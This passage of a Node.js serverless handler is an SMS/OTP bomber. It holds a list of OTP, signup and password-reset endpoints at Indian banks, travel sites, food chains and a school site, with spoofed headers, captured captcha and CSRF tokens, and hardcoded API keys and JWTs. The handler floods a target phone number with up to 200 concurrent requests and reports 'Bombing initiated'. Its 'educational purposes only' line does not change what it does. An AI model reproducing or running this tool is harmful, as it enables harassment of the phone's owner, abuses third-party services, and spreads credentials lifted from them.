      'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
      'Content-Type': 'application/json;charset=UTF-8',
      'x-api-client': 'mobilesite'
    },
    data: (number) => ({ telephone: number })
  },
  // UrbanClap
  {
    method: 'POST',
    url: 'https://www.urbanclap.com/api/v2/growth/profile/generateOTP',
    headers: {
      'Host': 'www.urbanclap.com',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'x-device-os': 'web',
      'x-version-name': 'web_v4.137.2',
      'x-client-key': 'f4113c23a68c9cb3bf695c4490f9f3da9abc8674712f5b870906ec26bab7602aed85ad71640e8d9f785ea09db5a298a950b335adc5b8cbb6ce58209e2912eac6',
      'x-device-id': 'ucuf1348-a14e179422-8c71-b87f-9eb1-edeca1376e-1600777338230',
      'x-version-code': '4.137.2',
      'Origin': 'https://www.urbancompany.com'
    },
    data: (number) => ({
      country_id: 'IND',
      phone: {
        isd_code: '+91',
        phone_wo_isd: number
      },
      device_type: 'customer'
    })
  },
  // Quikr
  {
    method: 'POST',
    url: 'https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3',
    headers: {
      'Host': 'www.quikr.com',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'Origin': 'https://www.quikr.com'
    },
    data: (number) => `user=${number}&CSRFKey=login_csrf_token&CSRFValue=2d798470b2fb7b96d59d41ce289f6b88&token=03AGdBq250swygN0BZpSQUIeR3kzgOs7dzUMwPxeC99DpmRiCqpfyUMLfFITJT6V6KAV8T94vfhY7IYg0Dg4DK5Vy8SEhGXg5XrKqRI1K6YqQwTOCWu9w6cwVSXhTXFXPraD6tYAumNW92Czo3wer9VOEmbYDZpvVVT3kgLzbFCPGu_BZjakj6dF1LkyajBiiWDqSiV15D73atPRfUdo_7CAjBrtzEyyKorYztttEWIhqMI-wKXL_EGtyDAhDRVnQKIjKvMzW4vVYSUWiQ5ffKM7KUlNvy8QJAIYD-3sJ-TT9mD5WP1KgPuw8dbyDvLFv36q7-IDMJYWU0nZXa6Ot8rVPqqqAkCZcoCcLcCHPFGj_pheOOkoEEo7E022NTJBPHxXUVA7fJP8zqXFWjajX0ljFT6iZj5qB5yEOviiTj1kTtt1xmfea7Zs7WtwV9QKd5ytbheE-VUAxoFcRff-6zXSSerEXVdwv892fnnhSVbYWH3pABRoyr2Wh1RVBpYREY8fYihyu9V358&v3=true`
  },
  // Kotak
  {
    method: 'POST',
    url: 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home-mobile.action?source=VKYCIL&banner=ILVKYClaunch&pubild=VKYClaunchmailer_1696_&SWNToken=1603857481489&flw=vkyc',
    headers: {
      'Host': 'www.kotak.com',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.kotak.com'
    },
    data: (number) => `cust_full_name=Tsunami+Bomber&cust_email=tsunami%40gmail.com&cust_mobile=${number}&cust_political_disclaimer=Yes&cust_fatca_disclaimer=Yes`
  },
  // Kotak Resend OTP
  {
    method: 'POST',
    url: 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/resend-otp0on-call.action?SWNToken=1603857646468&flw=vkyc',
    headers: {
      'Host': 'www.kotak.com',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Origin': 'https://www.kotak.com'
    }
  },
  // Happyeasygo
  {
    method: 'GET',
    url: (number) => `https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20${number}&verifycode=FDCA`,
    headers: {
      'Host': 'm.happyeasygo.com',
      'Accept': 'application/json, text/plain, */*',
      'x-device': 'mobile',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Referer': 'https://m.happyeasygo.com/register'
    }
  },
  // MakeMyTrip
  {
    method: 'POST',
    url: 'https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr',
    headers: {
      'Host': 'mapi.makemytrip.com',
      'deviceid': 'a3d2f892-af4d-40d1-808a-db6286b8fe1f',
      'currency': 'inr',
      'language': 'eng',
      'authorization': 'h4nhc9jcgpAGIjp',
      'visitor-id': 'a3d2f892-af4d-40d1-808a-db6286b8fe1f',
      'region': 'in',
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://www.makemytrip.com'
    },
    data: (number) => ({
      loginId: number,
      type: 'MOBILE',
      version: 2,
      countryCode: '91'
    })
  },
  // Ola
  {
    method: 'POST',
    url: 'https://accounts.olacabs.com/api/login',
    headers: {
      'Host': 'accounts.olacabs.com',
      'x-fingerprint-id': '3664542227',
      'csrf-token': 'v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I',
      'x-requested-with': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://accounts.olacabs.com'
    },
    data: (number) => ({
      mobileNumber: number,
      dialingCode: '+91',
      countryCode: 'IN',
      headers: {},
      verificationId: null,
      captchaInfo: {
        gcaptcha: '03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA',
        fingerPrint: 3664542227,
        storageId: '16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l'
      }
    })
  },
  // EaseMyTrip
  {
    method: 'POST',
    url: 'https://mybookings.easemytrip.com/MyBooking/RegisterNewUser/',
    headers: {
      'Host': 'mybookings.easemytrip.com',
      'Accept': 'text/plain, */*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json; charset=UTF-8',
      'Origin': 'https://mybookings.easemytrip.com'
    },
    data: (number) => ({ emailph: number })
  },
  // Oyo
  {
    method: 'POST',
    url: 'https://www.oyorooms.com/api/pwa/generateotp?locale=en',
    headers: {
      'Host': 'www.oyorooms.com',
      'xsrf-token': 'vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'text/plain;charset=UTF-8',
      'Origin': 'https://www.oyorooms.com'
    },
    data: (number) => ({
      phone: number,
      country_code: '+91',
      nod: 4
    })
  },
  // Dominos
  {
    method: 'POST',
    url: 'https://api.dominos.co.in/loginhandler/forgotpassword',
    headers: {
      'Host': 'api.dominos.co.in',
      'api_key': 'd2aeb489bb8df385',
      'secretkey': 'dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://m.dominos.co.in'
    },
    data: (number) => ({
      lastName: '',
      mobile: number,
      firstName: ''
    })
  },
  // PizzaHut
  {
    method: 'POST',
    url: 'https://api.pizzahut.io/v1/otp/generate',
    headers: {
      'Host': 'api.pizzahut.io',
      'x-trace-id': 'f222f460-946d-4c59-bb9e-e87db924399c',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json; charset=utf-8',
      'Origin': 'https://www.pizzahut.co.in'
    },
    data: (number) => ({ phone: `+91${number}` })
  },
  // KFC
  {
    method: 'POST',
    url: 'https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228',
    headers: {
      'Host': 'online.kfc.co.in',
      '__requestverificationtoken': 'x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/json;charset=UTF-8',
      'Origin': 'https://online.kfc.co.in'
    },
    data: (number) => ({
      phoneNumber: number,
      AuthorizedFor: '3',
      Resend: 'false'
    })
  },
  // BurgerKing
  {
    method: 'POST',
    url: 'https://consumer-apis.burgerking.in/api/v1/user/signUp',
    headers: {
      'Host': 'consumer-apis.burgerking.in',
      'appversion': '1.6',
      'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70',
      'content-type': 'application/json',
      'timestamp': '1604561218463',
      'userid': 'TEMP6922285271604561176',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'platform': 'web',
      'type': 'dinein',
      'encryptionkey': '39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38',
      'Origin': 'https://www.burgerking.in'
    },
    data: (number) => ({ phone_no: number })
  },
  // Dineout
  {
    method: 'POST',
    url: 'https://www.dineout.co.in/xhrajaxrequest/user_signup',
    headers: {
      'Host': 'www.dineout.co.in',
      'Accept': 'application/json, text/javascript, /*; q=0.01',
      'X-Requested-With': 'XMLHttpRequest',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'Origin': 'https://www.dineout.co.in'
    },
    data: (number) => `name=Tsunami+Bomber&email=tsunami%40gmail.com&phone=${number}`
  },
  // Purplle
  {
    method: 'GET',
    url: (number) => `https://www.purplle.com/api/account/authorization/send_otp?phone=${number}&action=register`,
    headers: {
      'Host': 'www.purplle.com',
      'device_id': 'TEC3cjyVJhEFPGsSHw',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs',
      'Referer': 'https://www.purplle.com/login'
    }
  },
  // Angel Broking
  {
    method: 'POST',
    url: 'https://www.angelbroking.com/form-gateways/oda-form.php',
    headers: {
      'Host': 'www.angelbroking.com',
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Origin': 'https://www.angelbroking.com'
    },
    data: (number) => `name=Tsunami+Bomber&mobile=${number}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752`
  },
  // ASVM Faizabad (School site)
  {
    method: 'POST',
    url: 'http://asvmfaizabad.org/register.php',
    headers: {
      'Host': 'asvmfaizabad.org',
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36',
      'Origin': 'http://asvmfaizabad.org'
    },
    data: (number) => `sname=Tsunami&sclass=XII&sphone=${number}&spassword=tsunamiastronomia&ssection=A&submit=`
  }
];

// ============================================================
// ðŸ”¥ CORE HANDLER
// ============================================================
module.exports = async (req, res) => {
  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  const { number, count = 1 } = req.body;

  if (!number) {
    return res.status(400).json({ error: 'Missing "number" parameter.' });
  }

  // Clean number
  const cleanNumber = number.replace(/\D/g, '');
  if (cleanNumber.length < 10 || cleanNumber.length > 15) {
    return res.status(400).json({ error: 'Invalid phone number. Must be 10-15 digits.' });
  }

  const totalRequests = Math.min(Number(count) || 1, 50); // Max 50 per call
  const results = { success: 0, failed: 0, details: [] };

  // Send requests concurrently (limited to 10 at a time to avoid rate limits)
  const concurrency = 10;
  const chunks = [];
  for (let i = 0; i < totalRequests; i++) {
    chunks.push(i);
  }

  const chunkSize = Math.min(concurrency, ENDPOINTS.length);
  const allEndpoints = ENDPOINTS.slice(0, 50); // Use first 50 endpoints to avoid timeout

  const tasks = [];
  for (let i = 0; i < totalRequests; i++) {
    for (const endpoint of allEndpoints) {
      tasks.push(sendRequest(endpoint, cleanNumber));
    }
  }

  // Limit tasks to 200 to prevent Vercel timeout (max 10s)
  const limitedTasks = tasks.slice(0, 200);

  const responses = await Promise.allSettled(limitedTasks);

  for (const r of responses) {
    if (r.status === 'fulfilled') {
      results.success++;
      results.details.push({ status: 'success', url: r.value.url });
    } else {
      results.failed++;
      results.details.push({ status: 'failed', error: r.reason });
    }
  }

  res.status(200).json({
    status: 'Bombing initiated',
    target: cleanNumber,
    total_attempts: limitedTasks.length,
    success: results.success,
    failed: results.failed,
    message: 'Use responsibly. For educational purposes only.'
  });
};

// ============================================================
// ðŸ”¥ SEND REQUEST HELPER
// ============================================================
async function sendRequest(endpoint, number) {
  try {
    let url = endpoint.url;
    if (typeof url === 'function') {
      url = url(number);
    }
    const method = endpoint.method || 'POST';
    let data = endpoint.data;
    if (typeof data === 'function') {
      data = data(number);
    }
    const headers = endpoint.headers || {};

    const config = {
      method,
      url,
      headers,
      timeout: 5000, // 5 second timeout per request
    };

    if (method === 'GET') {
      // No body
    } else if (method === 'POST' || method === 'PUT') {
      if (typeof data === 'string') {
        config.data = data;
      } else {
        config.data = data;
      }
    }

    const response = await axios(config);
    return { url, status: response.status };
  } catch (error) {
    throw { url: endpoint.url, error: error.message };
  }
}




